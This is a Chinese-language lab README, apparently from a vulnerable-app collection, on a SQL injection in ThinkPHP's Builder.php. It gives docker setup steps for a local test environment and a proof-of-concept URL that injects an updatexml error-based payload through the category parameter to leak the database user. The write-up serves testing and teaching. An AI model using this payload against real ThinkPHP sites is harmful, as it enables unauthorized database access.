## ThinkPHP Builder.php SQL注入漏洞

### 漏洞信息

 - [敏信审计系列之THINKPHP3.2开发框架](https://mp.weixin.qq.com/s/4xXS7usHMFNgDTEHcHBcBA)
 - [代码审计|ThinkPHP 5.0.x框架SQL注入](https://mp.weixin.qq.com/s/lNaH2-AAtk9JVKbbCBeIRA)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:t_thinkphp_1
 ```

2. 启动环境

 ```
$ docker run -d -p 80:80 medicean/vulapps:t_thinkphp_1
 ```
 > `-p 80:80` 前面的 80 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`, 假设启动的端口号为 80

#### PoC

1. 访问 `http://127.0.0.1/`，测试服务是否启动成功。

 > 该 Demo 是个消息盒子，灰色是已读消息，黑色为未读消息，当批量标记已读时，会触发漏洞

 ![](http://vulapps.poetn.cc/images/t_thinkphp_1_1.png)

2. 打开Burp，开启抓包，选择消息类别后，点击「标记已读」按钮，截获到数据包

 该请求为 GET, 请求的 URL 为: 
 ```
http://127.0.0.1/Home/Index/readcategorymsg?category=%E7%B3%BB%E7%BB%9F%E6%B6%88%E6%81%AF
 ```

 ![](http://vulapps.poetn.cc/images/t_thinkphp_1_2.png)

3. 修改GET参数`category`,提交到服务端后页面出现SQL注入报错结果:

 ```
http://127.0.0.1/Home/Index/readcategorymsg?category[0]=bind&category[1]=0 and (updatexml(1,concat(0x7e,(user())),0))
 ```

 ![](http://vulapps.poetn.cc/images/t_thinkphp_1_3.png)

 > 如果使用了参考文章中的 exp , 在尝试的时候出现`1690:DOUBLE value is out of range in 'exp(~((select 'a'.'user()' from (select user() AS 'user()') 'a')))'` 只返回了语句并未报出结果，是因为使用的 mysql exp 报错注入会因为 mysql 版本的原因可能会不成功，建议使用 updatexml 来进行

 **注意：当DEBUG模式关闭时，不会显示报错信息！**

### 参考链接

- [敏信审计系列之THINKPHP3.2开发框架](https://mp.weixin.qq.com/s/4xXS7usHMFNgDTEHcHBcBA)
- [代码审计 | ThinkPHP 5.0.x框架SQL注入](https://mp.weixin.qq.com/s/lNaH2-AAtk9JVKbbCBeIRA)
